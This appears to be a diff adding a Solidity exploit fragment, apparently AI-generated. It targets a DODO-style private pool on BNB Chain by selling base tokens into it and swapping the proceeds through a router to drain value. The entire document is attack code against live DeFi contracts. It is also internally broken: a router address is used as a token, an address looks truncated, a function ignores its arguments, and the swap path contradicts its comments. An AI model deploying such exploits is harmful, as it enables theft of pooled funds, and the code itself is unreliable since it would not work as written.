@@ -1,0 +1,42 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // First, we should observe the initial state of the contract and reserves
+    console.log("Initial valuable balance: ", valuableToken.balanceOf(address(this)));
+
+    // Fetch the token address of the chosen valuable token (in this case WBNB)
+    address baseToken = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB
+    // Fetch the quote token address
+    address quoteToken = 0x10ED43C718714eb63d5A57B78B54704E256024E; // Pancake Router
+
+    // Execute sell actions on the DPP contract
+    uint256 receiveAmountQuote = executeSell(baseToken, amount);
+    console.log("Received quote amount from sell: ", receiveAmountQuote);
+
+    // Create path for swapping back to valuable token (WBNB)
+    address[] memory path = new address[](2);
+    path[0] = baseToken; 
+    path[1] = quoteToken;
+
+    // Ensure we have approval for the quote token
+    IERC20(quoteToken).approve(address(uniswapRouter), receiveAmountQuote);
+
+    // Now we can swap back from quote to valuable token (WBNB)
+    uint256 minAmountOut = 0; // <-- Define a min amount out if desired
+    uint256[] memory amountsOut = uniswapRouter.swapExactTokensForTokens(
+        receiveAmountQuote, 
+        minAmountOut,
+        path, 
+        address(this), 
+        block.timestamp
+    );
+
+    console.log("Final valuable token balance: ", valuableToken.balanceOf(address(this)));
+}
+
+function executeSell(address token, uint256 amount) internal returns (uint256) {
+    // Call to DPP to sell base tokens and obtain quote tokens
+    return IDPP(target).sellBase(address(this));
+}
+</executeExploitCode>
+```
